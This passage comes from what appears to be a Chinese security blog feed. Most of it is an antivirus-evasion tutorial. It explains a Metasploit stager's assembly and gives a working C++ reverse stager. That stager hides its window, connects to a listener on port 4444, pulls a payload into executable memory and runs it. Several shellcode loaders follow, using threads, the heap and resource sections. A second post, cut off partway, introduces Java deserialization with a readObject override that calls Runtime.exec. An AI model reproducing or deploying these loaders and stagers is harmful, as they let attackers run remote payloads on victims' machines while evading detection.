call ebp               ; recv( s, &amp;dwLength, 4, 0 );<br>  ; Alloc a RWX buffer for the second stage<br>  mov esi, [esi]         ; dereference the pointer to the second stage length<br>  push byte 0x40         ; PAGE_EXECUTE_READWRITE<br>  push 0x1000            ; MEM_COMMIT<br>  push esi               ; push the newly recieved second stage length.<br>  push byte 0            ; NULL as we dont care where the allocation is.<br>  push 0xE553A458        ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAlloc&quot; )<br>  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );<br>  ; Receive the second stage and execute it...<br>  xchg ebx, eax          ; ebx = our new memory address for the new stage<br>  push ebx               ; push the address of the new stage so we can return into it<br>read_more:               ;<br>  push byte 0            ; flags<br>  push esi               ; length<br>  push ebx               ; the current address into our second stage&#x27;s RWX buffer<br>  push edi               ; the saved socket<br>  push 0x5FC8D902        ; hash( &quot;ws2_32.dll&quot;, &quot;recv&quot; )<br>  call ebp               ; recv( s, buffer, length, 0 );<br>  add ebx, eax           ; buffer += bytes_received<br>  sub esi, eax           ; length -= bytes_received, will set flags<br>  jnz read_more          ; continue if we have more to read<br>  ret                    ; return into the second stage<br></code></pre></td></tr></table></figure><p>这个文件是处理接收到的内容的，运行 recv 接收一个4字节，然后把这个4字节内容作为长度，使用virtualAlloc开辟对应长度的空间，循环读接下来发送过来的内容并存到刚刚开辟的空间里面，最后直接ret 将之前开辟空间的地址放到eip，运行传输过来的内容用于第二阶段的持续控制。 </p><ol><li>接收第二阶段的大小</li><li>为第二阶段分配一个RWX（可读可写可执行）的缓冲区</li><li>接收第二阶段的代码到缓冲区</li><li>最后，使用ret指令从函数中返回，并跳转到第二阶段的地址，开始执行第二阶段的代码。</li></ol><h6 id="c-实现shellcode连接"><a href="#c-实现shellcode连接" class="headerlink" title="c++实现shellcode连接"></a>c++实现shellcode连接</h6><p>接下来使用c++实现上述的功能，替代shellcode，直接利用socket与msf建立连接，实现免杀</p><p>主要步骤：</p><ol><li>找到ws2_32.dll库</li><li>初始化socket对象</li><li>开始建立链接</li><li>申请需要的内存空间</li><li>循环接受msf传递的payload到内存空间中</li><li>使用汇编指令jmp将内存空间中的payload转换成可执行的代码</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;WinSock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> <span class="hljs-keyword">warning</span> (disable: 4996)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib,<span class="hljs-string">&quot;WS2_32.lib&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">ShowWindow</span>(<span class="hljs-built_in">GetForegroundWindow</span>(), <span class="hljs-number">0</span>); <span class="hljs-comment">//将当前活动窗口隐藏</span><br><span class="hljs-comment">//分配socket资源</span><br>WSADATA wsdata;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsdata))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WSAStartp fail.\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//申请socket，并链接</span><br>SOCKET socket = <span class="hljs-built_in">WSASocket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>SOCKADDR_IN server;<br><span class="hljs-built_in">ZeroMemory</span>(&amp;server, <span class="hljs-built_in">sizeof</span>(SOCKADDR_IN));<br>server.sin_family = AF_INET;<br>server.sin_addr.s_addr = <span class="hljs-built_in">inet_addr</span>(<span class="hljs-string">&quot;X.X.X.X&quot;</span>); <span class="hljs-comment">//server ip</span><br>server.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">4444</span>); <span class="hljs-comment">//server port</span><br><span class="hljs-keyword">if</span> (SOCKET_ERROR == <span class="hljs-built_in">connect</span>(socket, (SOCKADDR*)&amp;server, <span class="hljs-built_in">sizeof</span>(server)))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;connect to server fail.\n&quot;</span>);<br><span class="hljs-keyword">goto</span> Fail;<br>&#125;<br><br><span class="hljs-comment">//接收长度</span><br>u_int stagelength;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">recv</span>(socket, (<span class="hljs-type">char</span>*)&amp;stagelength, <span class="hljs-built_in">sizeof</span>(stagelength), <span class="hljs-number">0</span>) != <span class="hljs-built_in">sizeof</span>(stagelength))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv error\n&quot;</span>);<br><span class="hljs-keyword">goto</span> Fail;<br>&#125;<br><br><span class="hljs-comment">//分配空间，以接收真正载荷</span><br><span class="hljs-type">char</span>* orig_buffer;<br>orig_buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, stagel ength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><span class="hljs-type">char</span>* stage_buf;<br>stage_buf = orig_buffer;<br><span class="hljs-type">int</span> ret;<br>ret = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">do</span><br>&#123;<br>ret = <span class="hljs-built_in">recv</span>(socket, stage_buf, stagelength, <span class="hljs-number">0</span>);<br>stage_buf += ret;<br>stagelength -= ret;<br>&#125; <span class="hljs-keyword">while</span> (ret &gt; <span class="hljs-number">0</span> &amp;&amp; stagelength &gt; <span class="hljs-number">0</span>);<br><br><br><span class="hljs-comment">//传入参数，并执行载荷</span><br>__asm<br>&#123;<br>mov edi, socket;   <span class="hljs-comment">//socket 存放在edi中</span><br>jmp orig_buffer; <span class="hljs-comment">//执行权转移到 载荷中，不要指望它返回。如果想要它返回，修改量比较大，不如把这个地方做成个线程,监听端设置退出时ExitThread更方便</span><br>&#125;<br><br><span class="hljs-comment">//释放空间</span><br><span class="hljs-built_in">VirtualFree</span>(orig_buffer, <span class="hljs-number">0</span>, MEM_RELEASE);<br><br>Fail:<br><br><span class="hljs-built_in">closesocket</span>(socket);<br><span class="hljs-built_in">WSACleanup</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="基础加载器"><a href="#基础加载器" class="headerlink" title="基础加载器"></a>基础加载器</h3><h4 id="1、内联汇编加载"><a href="#1、内联汇编加载" class="headerlink" title="1、内联汇编加载"></a>1、内联汇编加载</h4><p>使用内联汇编只能加载32位程序的ShellCode，因为64位程序不支持写内联汇编</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/section:.data,RWE&quot;</span>) <span class="hljs-comment">//将data段的内存设置成可读可写可执行</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">//ShellCode部分</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <br>__asm &#123;<br>lea eax,buf    <span class="hljs-comment">// lea是赋予地址的操作符 将buf的地址赋值给eax寄存器</span><br>call eax  <span class="hljs-comment">// call是函数调用操作符 调用eax，将eax里的值当作函数来执行</span><br>&#125;<br>&#125;<br><span class="hljs-comment">// 把buf的变量所在的位置当作我们执行的空间，赋予了一个可执行的属性，然后用函数调用的方式去执行</span><br></code></pre></td></tr></table></figure><h4 id="2、使用函数指针加载"><a href="#2、使用函数指针加载" class="headerlink" title="2、使用函数指针加载"></a>2、使用函数指针加载</h4><p>如下代码所示，<code>(void(*)(void))</code>是一个函数指针类型的强制转换, 该函数指针指向一个没有参数且返回值类型为void的函数，也就是说这行代码将 <code>buf</code> 的地址转换为一个函数指针，然后调用该指针所指向的函数，其实这种方法和上述加载方式原理是一样的，只不过这种方法还能用于加载64位的ShellCode</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/section:.data,RWE&quot;</span>) <span class="hljs-comment">//将data段的内存设置成可读可写可执行</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">//ShellCode部分</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] =<span class="hljs-string">&quot;0x??&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;   <br>((<span class="hljs-built_in">void</span>(*)(<span class="hljs-type">void</span>)) &amp; buf)();  <span class="hljs-comment">//执行ShellCode</span><br>&#125;<br><span class="hljs-comment">// void(*)(void) 定义一个函数类型 函数的返回值为空 函数的参数为空 并且是一个指针函数</span><br><span class="hljs-comment">// (void(*)(void) &amp;buf 将&amp;buf强制类型转换成void(*)(void)这个指针函数的类型</span><br><span class="hljs-comment">// ((void(*)(void)) &amp;buf) () 函数调用 调用((void(*)(void)) &amp;buf)一整个函数</span><br></code></pre></td></tr></table></figure><h4 id="3、创建线程加载"><a href="#3、创建线程加载" class="headerlink" title="3、创建线程加载"></a>3、创建线程加载</h4><p>上述两种方法都需要将data节的内存设置成可读可写可执行, 以下这段代码的主要作用是在内存中分配一段可执行的内存空间，将buf数组中的内容复制到该内存空间，并创建一个新线程来执行这段内存中的代码</p><p>主要分为三步：</p><ul><li>1、申请一段新的内存空间</li><li>2、把shellcode复制过去</li><li>3、用新的线程去执行这段新的空间里的内容</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">//ShellCode部分</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-comment">// 申请一块可进行读写操作的内存</span><br>    LPVOID pMemory = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><br>    <span class="hljs-comment">// 将buf数组中的内容复制到刚刚分配的内存中</span><br>    <span class="hljs-built_in">RtlMoveMemory</span>(pMemory, buf, <span class="hljs-built_in">sizeof</span>(buf));<br><br>    <span class="hljs-comment">// 创建一个新的线程来执行内存中的代码</span><br>    HANDLE hThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)pMemory, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// 设置为一直运行这个线程，除非收到Single信号才中断</span><br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4、通过堆加载"><a href="#4、通过堆加载" class="headerlink" title="4、通过堆加载"></a>4、通过堆加载</h4><p>这段代码首先创建了一个具有执行权限的堆，然后在堆中分配内存并将shellcode复制到内存中。最后，代码通过直接调用存储在内存中的shellcode来执行它 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">//ShellCode部分</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 创建一个具有执行权限的堆，以存储shellcode</span><br>    HANDLE HeapHandle = <span class="hljs-built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="hljs-built_in">sizeof</span>(shellcode), <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 在创建的堆中分配一块内存，并将其地址赋给buffer</span><br>    <span class="hljs-type">char</span>* buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">HeapAlloc</span>(HeapHandle, HEAP_ZERO_MEMORY, <span class="hljs-built_in">sizeof</span>(shellcode));<br><br>    <span class="hljs-comment">// 将shellcode复制到buffer指向的内存中</span><br>    <span class="hljs-built_in">memcpy</span>(buffer, shellcode, <span class="hljs-built_in">sizeof</span>(shellcode));<br><br>    <span class="hljs-comment">// 将buffer指向的内存地址强制转换为一个函数指针，并调用该函数，执行shellcode</span><br>    ((<span class="hljs-built_in">void</span>(*)(<span class="hljs-type">void</span>)) buffer)();<br>    <br>    <span class="hljs-comment">// 下面是另一种创建线程的方法，这里被注释掉了</span><br>    <span class="hljs-comment">// 创建一个新线程并执行buffer指向的内存中的shellcode</span><br>    <span class="hljs-comment">// HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);</span><br><br>    <span class="hljs-comment">// 等待新线程执行完毕</span><br>    <span class="hljs-comment">// WaitForSingleObject(hThread, INFINITE);</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5、基于资源节加载"><a href="#5、基于资源节加载" class="headerlink" title="5、基于资源节加载"></a>5、基于资源节加载</h4><h6 id="导入资源"><a href="#导入资源" class="headerlink" title="导入资源"></a>导入资源</h6><p>使用MSF生成bin文件，随后点击<code>VSstudio中添加资源-&gt;导入</code>，并选择生成的bin文件</p><img src="/2024/05/20/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/image-20240517213843599.png" class="" title="image-20240517213843599"><p>然后自定义bin文件的资源类型, 此处我自定义的类型为”shellcode”，当然你也可以定义成其它的名字</p><img src="/2024/05/20/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/image-20240517213856369.png" class="" title="image-20240517213856369"><p>添加完资源后会在当前项目生成一个<code>resource.h</code>, 代码如下所示，这里只需注意这段代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IDR_SHELLCODE1 101</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;resource.h&quot;</span></span><br><br><br><span class="hljs-comment">//&#123;&#123;NO_DEPENDENCIES&#125;&#125;</span><br><span class="hljs-comment">// Microsoft Visual C++ 生成的包含文件。</span><br><span class="hljs-comment">// 供 Shellcode加载器.rc 使用</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-comment">//IDR_SHELLCODE1 通常用于标识和引用项目中的某个资源，例如嵌入到可执行文件中的二进制数据、图像或其他类型的资源，在项目的其他部分（例如代码或资源脚本中），可以通过使用 IDR_SHELLCODE1 符号来引用这个资源，而不是直接使用数字常量（如 101</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IDR_SHELLCODE1                  101</span><br><br><span class="hljs-comment">// Next default values for new objects</span><br><span class="hljs-comment">// </span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> APSTUDIO_INVOKED</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> APSTUDIO_READONLY_SYMBOLS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _APS_NEXT_RESOURCE_VALUE        102</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _APS_NEXT_COMMAND_VALUE         40001</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _APS_NEXT_CONTROL_VALUE         1001</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _APS_NEXT_SYMED_VALUE           101</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h6 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h6><p>以下是完整shellcode加载器代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;resource.h&quot;</span></span><br><br><span class="hljs-comment">//通过资源加载ShellCode</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ResourceLoader</span><span class="hljs-params">()</span> </span>&#123;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    FindResource用于查找指定模块（EXE或DLL文件）中指定名称和类型的资源,其语法格式如下:</span><br><span class="hljs-comment">    HRSRC FindResource(</span><br><span class="hljs-comment">          HMODULE hModule,  //指向包含要查找的资源的模块的句柄,若该参数为NULL，则查找当前进程中的资源</span><br><span class="hljs-comment">          LPCTSTR lpName,   //指向资源名称的指针，可以是一个字符串或者一个整数，若是一个整数，则它是一个由MAKEINTRESOURCE宏定义的资源标识符</span><br><span class="hljs-comment">          LPCTSTR lpType    //指向资源类型的指针，可以是一个字符串或者一个整数。若是一个整数，则它是一个由MAKEINTRESOURCE宏定义的资源类型标识符</span><br><span class="hljs-comment">    );</span><br><span class="hljs-comment">    如果查找成功，则返回资源句柄；否则返回NULL</span><br><span class="hljs-comment">    */</span><br>    HRSRC Res = <span class="hljs-built_in">FindResource</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">MAKEINTRESOURCE</span>(IDR_SHELLCODE1), <span class="hljs-string">L&quot;shellcode&quot;</span>);<br><br>    <span class="hljs-comment">//用于获取资源的大小</span><br>    DWORD ResSize = <span class="hljs-built_in">SizeofResource</span>(<span class="hljs-literal">NULL</span>, Res);<br><br>    <span class="hljs-comment">//LoadResource函数会将指定资源句柄所指向的资源数据加载到内存中，并返回一个指向该资源数据的句柄</span><br>    HGLOBAL Load = <span class="hljs-built_in">LoadResource</span>(<span class="hljs-literal">NULL</span>, Res);<br><br>    <span class="hljs-comment">//申请内存</span><br>    <span class="hljs-type">void</span>* buffer = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, ResSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(buffer, Load, ResSize);<br><br>    <span class="hljs-comment">//执行shellcode</span><br>    ((<span class="hljs-built_in">void</span>(*)(<span class="hljs-type">void</span>)) buffer)();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>    <span class="hljs-built_in">ResourceLoader</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>导入资源和实现代码在一个exe中</p><p>静态免杀：要么自己写shellcode，要么加密混淆shellcode使其解不明白，要么分离shellcode。如果检查加载器另说</p>]]></content>
    
    
    <categories>
      
      <category>静态免杀</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shellcode</tag>
      
      <tag>加载器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化和类加载机制</title>
    <link href="/2024/05/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"/>
    <url>/2024/05/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h3 id="Java反序列化介绍："><a href="#Java反序列化介绍：" class="headerlink" title="Java反序列化介绍："></a>Java反序列化介绍：</h3><p>序列化（Serialization）：把Java对象转换为字节序列的过程。<br>反序列化（DeSerialization）：把字节序列恢复为Java对象的过程。</p><p>其中有两个重要的方法：<code>writeObject</code>和<code>readObject</code>。序列化时需要使用<code>writeObject</code>将对象转化为字节流，反序列化需要使用<code>readObject</code>将字节流转化为对象。</p><h4 id="反序列化基础操作"><a href="#反序列化基础操作" class="headerlink" title="反序列化基础操作"></a>反序列化基础操作</h4><p>打开idea，创建项目，新建一个 Person 类，创建一些属性和方法（注：要想对类进行序列化操作，需要实现 Serializable 类）</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424103734758.png" alt="image-20240424103734758"></p><p>新建一个 Serialization 类，代码中调用 <em><strong>writeObject</strong></em> 方法进行序列化操作，运行后会生成一个名为 ser.bin 的序列化文件</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424104644674.png" alt="image-20240424104644674"></p><p>新建一个 Unserialization 类，调用 <em><strong>readObject</strong></em> 方法对 ser.bin 文件内容进行反序列化操作，然后输出反序列化后的对象</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424110324114.png" alt="image-20240424110324114"></p><h4 id="反序列化漏洞原理"><a href="#反序列化漏洞原理" class="headerlink" title="反序列化漏洞原理"></a>反序列化漏洞原理</h4><p>根据上面的例子，可见完成序列化和反序列化离不开两个重要的方法 <code>writeObject</code> 和 <code>readObject</code> ，这两个方法可以经过开发者重写，一般序列化的重写都是由于下面这种场景诞生的。</p><p>只要服务端反序列化数据，客户端传递类的 <code>readObject</code> 中代码会自动执行，基于攻击者在服务器上运行代码的能力。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><ol><li>大前提：参与序列化的所有类都继承了 <code>Serializable</code>，即所有类都是可序列化的</li><li>入口类重写了 <code>readObject()</code>方法，且其参数类型宽泛，并且是 <code>jdk</code>自带的</li><li>构造调用链</li><li>执行类 (RCE、SSRF、读写文件等)</li></ol><h3 id="产生安全问题的形式"><a href="#产生安全问题的形式" class="headerlink" title="产生安全问题的形式"></a>产生安全问题的形式</h3><ol><li>入口类的 <code>readObject()</code>中调用了危险方法</li><li>入口类参数中包含可控类，该类调用 <code>readObject()</code>时会触发危险方法</li><li>入口类参数中包含可控类，该类 <code>readObject()</code>时调用其他类，其他类继续调用另一个类(套娃)，直到有一个类调用了危险方法 (正常情况下反序列化漏洞的利用方法)</li><li>构造函数&#x2F;静态代码块等类加载时隐式执行</li></ol><p>接下来对每种形式进行举例讲解：</p><h4 id="1-入口类的-readObject-直接调用危险方法"><a href="#1-入口类的-readObject-直接调用危险方法" class="headerlink" title="1.入口类的 readObject 直接调用危险方法"></a>1.入口类的 readObject 直接调用危险方法</h4><p>这种情况不太可能出现，但还是讲一下原理</p><p>在Person类中重写 readObject 方法，调用 <em>Runtime</em>.<em>getRuntime</em>().<em>exec</em>() 执行计算器</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424133907888.png" alt="image-20240424133907888"></p><p>进行序列化操作，生成ser.bin文件，对ser.bin文件反序列化时会调用重写的 readObject 方法，从而执行计算器</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424134034223.png" alt="image-20240424134034223"></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">原理：<br>1、在Java中，当一个类实现了Serializable接口并且重写readObject方法时，该方法会在对象进行反序列化时被调用。<br>2、由于在<span class="hljs-keyword">Person</span>类中实现了Serializable接口，并且重写了readObject方法，所以在反序列化时调用ois.readObject()会触发<span class="hljs-keyword">Person</span>类的readObject方法。<br></code></pre></td></tr></table></figure><p>一般不会有程序员这么写…</p><h4 